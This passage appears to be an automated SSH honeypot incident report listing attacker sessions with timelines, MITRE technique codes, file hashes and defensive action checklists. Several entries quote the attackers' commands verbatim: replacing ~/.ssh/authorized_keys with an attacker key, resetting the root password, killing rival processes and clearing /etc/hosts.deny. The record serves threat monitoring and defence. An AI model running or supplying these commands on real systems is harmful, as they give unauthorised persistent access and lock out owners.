| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:07:16` | `cowrie.session.connect` |
| `2026-06-08 11:07:16` | `cowrie.client.version` |
| `2026-06-08 11:07:16` | `cowrie.client.kex` |
| `2026-06-08 11:07:16` | `cowrie.login.success` |
| `2026-06-08 11:07:17` | `cowrie.session.params` |
| `2026-06-08 11:07:17` | `cowrie.command.input` |
| `2026-06-08 11:07:17` | `cowrie.command.failed` |
| `2026-06-08 11:07:17` | `cowrie.log.closed` |
| `2026-06-08 11:07:17` | `cowrie.session.params` |
| `2026-06-08 11:07:17` | `cowrie.command.input` |
| `2026-06-08 11:07:17` | `cowrie.session.file_download` |
| `2026-06-08 11:07:17` | `cowrie.log.closed` |
| `2026-06-08 11:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05e1a44b1129

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-06-08 11:07 |
| **Last Seen** | 2026-06-08 11:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:07:18` | `cowrie.session.connect` |
| `2026-06-08 11:07:18` | `cowrie.client.version` |
| `2026-06-08 11:07:18` | `cowrie.client.kex` |
| `2026-06-08 11:07:18` | `cowrie.login.success` |
| `2026-06-08 11:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72dce024500

| Field | Detail |
|---|---|
| **Source IP** | `14.29.235[.]187` |
| **First Seen** | 2026-06-08 11:08 |
| **Last Seen** | 2026-06-08 11:08 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:kUX3AIG5mRX1"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:08:15` | `cowrie.session.connect` |
| `2026-06-08 11:08:18` | `cowrie.client.version` |
| `2026-06-08 11:08:18` | `cowrie.client.kex` |
| `2026-06-08 11:08:19` | `cowrie.login.success` |
| `2026-06-08 11:08:19` | `cowrie.session.params` |
| `2026-06-08 11:08:19` | `cowrie.command.input` |
| `2026-06-08 11:08:19` | `cowrie.command.failed` |
| `2026-06-08 11:08:20` | `cowrie.log.closed` |
| `2026-06-08 11:08:21` | `cowrie.session.params` |
| `2026-06-08 11:08:21` | `cowrie.command.input` |
| `2026-06-08 11:08:22` | `cowrie.session.file_download` |
| `2026-06-08 11:08:22` | `cowrie.log.closed` |
| `2026-06-08 11:08:34` | `cowrie.session.params` |
| `2026-06-08 11:08:34` | `cowrie.command.input` |
| `2026-06-08 11:08:34` | `cowrie.log.closed` |
| `2026-06-08 11:08:35` | `cowrie.session.params` |
| `2026-06-08 11:08:35` | `cowrie.command.input` |
| `2026-06-08 11:08:35` | `cowrie.log.closed` |
| `2026-06-08 11:08:36` | `cowrie.session.params` |
| `2026-06-08 11:08:36` | `cowrie.command.input` |
| `2026-06-08 11:08:36` | `cowrie.session.file_download` |
| `2026-06-08 11:08:36` | `cowrie.log.closed` |
| `2026-06-08 11:08:37` | `cowrie.session.params` |
| `2026-06-08 11:08:37` | `cowrie.command.input` |
| `2026-06-08 11:08:37` | `cowrie.log.closed` |
| `2026-06-08 11:08:38` | `cowrie.session.params` |
| `2026-06-08 11:08:38` | `cowrie.command.input` |
| `2026-06-08 11:08:38` | `cowrie.log.closed` |
| `2026-06-08 11:08:39` | `cowrie.session.params` |
| `2026-06-08 11:08:39` | `cowrie.command.input` |
| `2026-06-08 11:08:39` | `cowrie.command.input` |
| `2026-06-08 11:08:39` | `cowrie.log.closed` |
| `2026-06-08 11:08:39` | `cowrie.session.params` |
| `2026-06-08 11:08:39` | `cowrie.command.input` |
| `2026-06-08 11:08:40` | `cowrie.log.closed` |
| `2026-06-08 11:08:41` | `cowrie.session.params` |
| `2026-06-08 11:08:41` | `cowrie.command.input` |
| `2026-06-08 11:08:41` | `cowrie.log.closed` |
| `2026-06-08 11:08:42` | `cowrie.session.params` |
| `2026-06-08 11:08:42` | `cowrie.command.input` |
| `2026-06-08 11:08:42` | `cowrie.log.closed` |
| `2026-06-08 11:08:43` | `cowrie.session.params` |
| `2026-06-08 11:08:43` | `cowrie.command.input` |
| `2026-06-08 11:08:43` | `cowrie.log.closed` |
| `2026-06-08 11:08:44` | `cowrie.session.params` |
| `2026-06-08 11:08:44` | `cowrie.command.input` |
| `2026-06-08 11:08:44` | `cowrie.log.closed` |
| `2026-06-08 11:08:44` | `cowrie.session.params` |
| `2026-06-08 11:08:44` | `cowrie.command.input` |
| `2026-06-08 11:08:45` | `cowrie.log.closed` |
| `2026-06-08 11:08:45` | `cowrie.session.params` |
| `2026-06-08 11:08:45` | `cowrie.command.input` |
| `2026-06-08 11:08:46` | `cowrie.log.closed` |
| `2026-06-08 11:08:46` | `cowrie.session.params` |
| `2026-06-08 11:08:46` | `cowrie.command.input` |
| `2026-06-08 11:08:46` | `cowrie.log.closed` |
| `2026-06-08 11:08:47` | `cowrie.session.params` |
| `2026-06-08 11:08:47` | `cowrie.command.input` |
| `2026-06-08 11:08:47` | `cowrie.log.closed` |
| `2026-06-08 11:08:48` | `cowrie.session.params` |
| `2026-06-08 11:08:48` | `cowrie.command.input` |
| `2026-06-08 11:08:49` | `cowrie.log.closed` |
| `2026-06-08 11:08:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.235[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.29.235[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c6b4c23ba4e

| Field | Detail |
|---|---|
| **Source IP** | `14.29.235[.]187` |
| **First Seen** | 2026-06-08 11:14 |
| **Last Seen** | 2026-06-08 11:15 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ExsJDfTcOM9D"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:14:38` | `cowrie.session.connect` |
| `2026-06-08 11:14:41` | `cowrie.client.version` |
| `2026-06-08 11:14:41` | `cowrie.client.kex` |
| `2026-06-08 11:14:42` | `cowrie.login.success` |
| `2026-06-08 11:14:42` | `cowrie.session.params` |
| `2026-06-08 11:14:42` | `cowrie.command.input` |
| `2026-06-08 11:14:42` | `cowrie.command.failed` |
| `2026-06-08 11:14:43` | `cowrie.log.closed` |
| `2026-06-08 11:14:43` | `cowrie.session.params` |
| `2026-06-08 11:14:43` | `cowrie.command.input` |
| `2026-06-08 11:14:43` | `cowrie.session.file_download` |
| `2026-06-08 11:14:43` | `cowrie.log.closed` |
| `2026-06-08 11:14:56` | `cowrie.session.params` |
| `2026-06-08 11:14:56` | `cowrie.command.input` |
| `2026-06-08 11:14:57` | `cowrie.log.closed` |
| `2026-06-08 11:14:57` | `cowrie.session.params` |
| `2026-06-08 11:14:57` | `cowrie.command.input` |
| `2026-06-08 11:14:58` | `cowrie.log.closed` |
| `2026-06-08 11:14:58` | `cowrie.session.params` |
| `2026-06-08 11:14:58` | `cowrie.command.input` |
| `2026-06-08 11:14:58` | `cowrie.session.file_download` |
| `2026-06-08 11:14:58` | `cowrie.log.closed` |
| `2026-06-08 11:14:59` | `cowrie.session.params` |
| `2026-06-08 11:14:59` | `cowrie.command.input` |
| `2026-06-08 11:14:59` | `cowrie.log.closed` |
| `2026-06-08 11:15:00` | `cowrie.session.params` |
| `2026-06-08 11:15:00` | `cowrie.command.input` |
| `2026-06-08 11:15:01` | `cowrie.log.closed` |
| `2026-06-08 11:15:01` | `cowrie.session.params` |
| `2026-06-08 11:15:01` | `cowrie.command.input` |
| `2026-06-08 11:15:01` | `cowrie.command.input` |
| `2026-06-08 11:15:02` | `cowrie.log.closed` |
| `2026-06-08 11:15:02` | `cowrie.session.params` |
| `2026-06-08 11:15:02` | `cowrie.command.input` |
| `2026-06-08 11:15:03` | `cowrie.log.closed` |
| `2026-06-08 11:15:03` | `cowrie.session.params` |
| `2026-06-08 11:15:03` | `cowrie.command.input` |
| `2026-06-08 11:15:03` | `cowrie.log.closed` |
| `2026-06-08 11:15:04` | `cowrie.session.params` |
| `2026-06-08 11:15:04` | `cowrie.command.input` |
| `2026-06-08 11:15:05` | `cowrie.log.closed` |
| `2026-06-08 11:15:05` | `cowrie.session.params` |
| `2026-06-08 11:15:05` | `cowrie.command.input` |
| `2026-06-08 11:15:06` | `cowrie.log.closed` |
| `2026-06-08 11:15:07` | `cowrie.session.params` |
| `2026-06-08 11:15:07` | `cowrie.command.input` |
| `2026-06-08 11:15:07` | `cowrie.log.closed` |
| `2026-06-08 11:15:08` | `cowrie.session.params` |
| `2026-06-08 11:15:08` | `cowrie.command.input` |
| `2026-06-08 11:15:08` | `cowrie.log.closed` |
| `2026-06-08 11:15:09` | `cowrie.session.params` |
| `2026-06-08 11:15:09` | `cowrie.command.input` |
| `2026-06-08 11:15:09` | `cowrie.log.closed` |
| `2026-06-08 11:15:09` | `cowrie.session.params` |
| `2026-06-08 11:15:09` | `cowrie.command.input` |
| `2026-06-08 11:15:10` | `cowrie.log.closed` |
| `2026-06-08 11:15:11` | `cowrie.session.params` |
| `2026-06-08 11:15:11` | `cowrie.command.input` |
| `2026-06-08 11:15:11` | `cowrie.log.closed` |
| `2026-06-08 11:15:12` | `cowrie.session.params` |
| `2026-06-08 11:15:12` | `cowrie.command.input` |
| `2026-06-08 11:15:12` | `cowrie.log.closed` |
| `2026-06-08 11:15:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.235[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.29.235[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da6154059e1f

| Field | Detail |
|---|---|
| **Source IP** | `59.27.249[.]238` |
| **First Seen** | 2026-06-08 11:26 |
| **Last Seen** | 2026-06-08 11:30 |
| **Session Duration** | 251s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:26:21` | `cowrie.session.connect` |
| `2026-06-08 11:26:21` | `cowrie.client.version` |
| `2026-06-08 11:26:23` | `cowrie.client.kex` |
| `2026-06-08 11:26:30` | `cowrie.login.failed` |
| `2026-06-08 11:26:32` | `cowrie.login.success` |
| `2026-06-08 11:26:34` | `cowrie.session.params` |
| `2026-06-08 11:26:34` | `cowrie.command.input` |
| `2026-06-08 11:26:34` | `cowrie.command.failed` |
| `2026-06-08 11:26:36` | `cowrie.log.closed` |
| `2026-06-08 11:26:38` | `cowrie.session.params` |
| `2026-06-08 11:26:38` | `cowrie.command.input` |
| `2026-06-08 11:26:40` | `cowrie.log.closed` |
| `2026-06-08 11:26:42` | `cowrie.session.params` |
| `2026-06-08 11:26:42` | `cowrie.command.input` |
| `2026-06-08 11:26:43` | `cowrie.log.closed` |
| `2026-06-08 11:26:46` | `cowrie.session.params` |
| `2026-06-08 11:26:46` | `cowrie.command.input` |
| `2026-06-08 11:26:47` | `cowrie.log.closed` |
| `2026-06-08 11:26:50` | `cowrie.session.params` |
| `2026-06-08 11:26:50` | `cowrie.command.input` |
| `2026-06-08 11:26:51` | `cowrie.log.closed` |
| `2026-06-08 11:26:54` | `cowrie.session.params` |
| `2026-06-08 11:26:54` | `cowrie.command.input` |
| `2026-06-08 11:26:55` | `cowrie.log.closed` |
| `2026-06-08 11:26:58` | `cowrie.session.params` |
| `2026-06-08 11:26:58` | `cowrie.command.input` |
| `2026-06-08 11:26:59` | `cowrie.log.closed` |
| `2026-06-08 11:27:02` | `cowrie.session.params` |
| `2026-06-08 11:27:02` | `cowrie.command.input` |
| `2026-06-08 11:27:03` | `cowrie.log.closed` |
| `2026-06-08 11:27:06` | `cowrie.session.params` |
| `2026-06-08 11:27:06` | `cowrie.command.input` |
| `2026-06-08 11:27:07` | `cowrie.log.closed` |
| `2026-06-08 11:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.27.249[.]238` to AbuseIPDB if not already reported
- [ ] Block `59.27.249[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f0c92d6b25

| Field | Detail |
|---|---|
| **Source IP** | `89.47.53[.]19` |
| **First Seen** | 2026-06-08 11:34 |
| **Last Seen** | 2026-06-08 11:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:34:26` | `cowrie.session.connect` |
| `2026-06-08 11:34:26` | `cowrie.client.version` |
| `2026-06-08 11:34:26` | `cowrie.client.kex` |
| `2026-06-08 11:34:26` | `cowrie.login.success` |
| `2026-06-08 11:34:27` | `cowrie.session.params` |
| `2026-06-08 11:34:27` | `cowrie.command.input` |
| `2026-06-08 11:34:27` | `cowrie.command.failed` |
| `2026-06-08 11:34:27` | `cowrie.log.closed` |
| `2026-06-08 11:34:27` | `cowrie.session.params` |
| `2026-06-08 11:34:27` | `cowrie.command.input` |
| `2026-06-08 11:34:27` | `cowrie.session.file_download` |
| `2026-06-08 11:34:27` | `cowrie.log.closed` |
| `2026-06-08 11:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.47.53[.]19` to AbuseIPDB if not already reported
- [ ] Block `89.47.53[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf36e4762e3f

| Field | Detail |
|---|---|
| **Source IP** | `220.154.133[.]120` |
| **First Seen** | 2026-06-08 11:34 |
| **Last Seen** | 2026-06-08 11:34 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:IcbNo3p0mWGK"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:34:26` | `cowrie.session.connect` |
| `2026-06-08 11:34:26` | `cowrie.client.version` |
| `2026-06-08 11:34:26` | `cowrie.client.kex` |
| `2026-06-08 11:34:27` | `cowrie.login.success` |
| `2026-06-08 11:34:27` | `cowrie.session.params` |
| `2026-06-08 11:34:27` | `cowrie.command.input` |
| `2026-06-08 11:34:27` | `cowrie.command.failed` |
| `2026-06-08 11:34:27` | `cowrie.log.closed` |
| `2026-06-08 11:34:28` | `cowrie.session.params` |
| `2026-06-08 11:34:28` | `cowrie.command.input` |
| `2026-06-08 11:34:28` | `cowrie.session.file_download` |
| `2026-06-08 11:34:28` | `cowrie.log.closed` |
| `2026-06-08 11:34:44` | `cowrie.session.params` |
| `2026-06-08 11:34:44` | `cowrie.command.input` |
| `2026-06-08 11:34:44` | `cowrie.log.closed` |
| `2026-06-08 11:34:45` | `cowrie.session.params` |
| `2026-06-08 11:34:45` | `cowrie.command.input` |
| `2026-06-08 11:34:45` | `cowrie.log.closed` |
| `2026-06-08 11:34:45` | `cowrie.session.params` |
| `2026-06-08 11:34:45` | `cowrie.command.input` |
| `2026-06-08 11:34:45` | `cowrie.session.file_download` |
| `2026-06-08 11:34:45` | `cowrie.log.closed` |
| `2026-06-08 11:34:45` | `cowrie.session.params` |
| `2026-06-08 11:34:45` | `cowrie.command.input` |
| `2026-06-08 11:34:46` | `cowrie.log.closed` |
| `2026-06-08 11:34:46` | `cowrie.session.params` |
| `2026-06-08 11:34:46` | `cowrie.command.input` |
| `2026-06-08 11:34:46` | `cowrie.log.closed` |
| `2026-06-08 11:34:46` | `cowrie.session.params` |
| `2026-06-08 11:34:46` | `cowrie.command.input` |
| `2026-06-08 11:34:46` | `cowrie.command.input` |
| `2026-06-08 11:34:47` | `cowrie.log.closed` |
| `2026-06-08 11:34:47` | `cowrie.session.params` |
| `2026-06-08 11:34:47` | `cowrie.command.input` |
| `2026-06-08 11:34:47` | `cowrie.log.closed` |
| `2026-06-08 11:34:47` | `cowrie.session.params` |
| `2026-06-08 11:34:47` | `cowrie.command.input` |
| `2026-06-08 11:34:48` | `cowrie.log.closed` |
| `2026-06-08 11:34:48` | `cowrie.session.params` |
| `2026-06-08 11:34:48` | `cowrie.command.input` |
| `2026-06-08 11:34:48` | `cowrie.log.closed` |
| `2026-06-08 11:34:48` | `cowrie.session.params` |
| `2026-06-08 11:34:48` | `cowrie.command.input` |
| `2026-06-08 11:34:48` | `cowrie.log.closed` |
| `2026-06-08 11:34:49` | `cowrie.session.params` |
| `2026-06-08 11:34:49` | `cowrie.command.input` |
| `2026-06-08 11:34:49` | `cowrie.log.closed` |
| `2026-06-08 11:34:49` | `cowrie.session.params` |
| `2026-06-08 11:34:49` | `cowrie.command.input` |
| `2026-06-08 11:34:49` | `cowrie.log.closed` |
| `2026-06-08 11:34:50` | `cowrie.session.params` |
| `2026-06-08 11:34:50` | `cowrie.command.input` |
| `2026-06-08 11:34:50` | `cowrie.log.closed` |
| `2026-06-08 11:34:50` | `cowrie.session.params` |
| `2026-06-08 11:34:50` | `cowrie.command.input` |
| `2026-06-08 11:34:50` | `cowrie.log.closed` |
| `2026-06-08 11:34:51` | `cowrie.session.params` |
| `2026-06-08 11:34:51` | `cowrie.command.input` |
| `2026-06-08 11:34:51` | `cowrie.log.closed` |
| `2026-06-08 11:34:51` | `cowrie.session.params` |
| `2026-06-08 11:34:51` | `cowrie.command.input` |
| `2026-06-08 11:34:51` | `cowrie.log.closed` |
| `2026-06-08 11:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.154.133[.]120` to AbuseIPDB if not already reported
- [ ] Block `220.154.133[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c1553a640c

| Field | Detail |
|---|---|
| **Source IP** | `89.47.53[.]19` |
| **First Seen** | 2026-06-08 11:34 |
| **Last Seen** | 2026-06-08 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:34:30` | `cowrie.session.connect` |
| `2026-06-08 11:34:30` | `cowrie.client.version` |
| `2026-06-08 11:34:30` | `cowrie.client.kex` |
| `2026-06-08 11:34:30` | `cowrie.login.success` |
| `2026-06-08 11:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.47.53[.]19` to AbuseIPDB if not already reported
- [ ] Block `89.47.53[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e9ff448b86

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 11:48 |
| **Last Seen** | 2026-06-08 11:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:48:06` | `cowrie.session.connect` |
| `2026-06-08 11:48:06` | `cowrie.client.version` |
| `2026-06-08 11:48:06` | `cowrie.client.kex` |
| `2026-06-08 11:48:07` | `cowrie.login.success` |
| `2026-06-08 11:48:07` | `cowrie.session.params` |
| `2026-06-08 11:48:07` | `cowrie.command.input` |
| `2026-06-08 11:48:07` | `cowrie.command.failed` |
| `2026-06-08 11:48:07` | `cowrie.log.closed` |
| `2026-06-08 11:48:07` | `cowrie.session.params` |
| `2026-06-08 11:48:07` | `cowrie.command.input` |
| `2026-06-08 11:48:07` | `cowrie.session.file_download` |
| `2026-06-08 11:48:07` | `cowrie.log.closed` |
| `2026-06-08 11:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57ead700617f

| Field | Detail |
|---|---|
| **Source IP** | `144.79.133[.]50` |
| **First Seen** | 2026-06-08 11:48 |
| **Last Seen** | 2026-06-08 11:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 11:48:08` | `cowrie.session.connect` |
| `2026-06-08 11:48:08` | `cowrie.client.version` |
| `2026-06-08 11:48:09` | `cowrie.client.kex` |
| `2026-06-08 11:48:09` | `cowrie.login.success` |
| `2026-06-08 11:48:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.79.133[.]50` to AbuseIPDB if not already reported
- [ ] Block `144.79.133[.]50` at perimeter firewall / security group
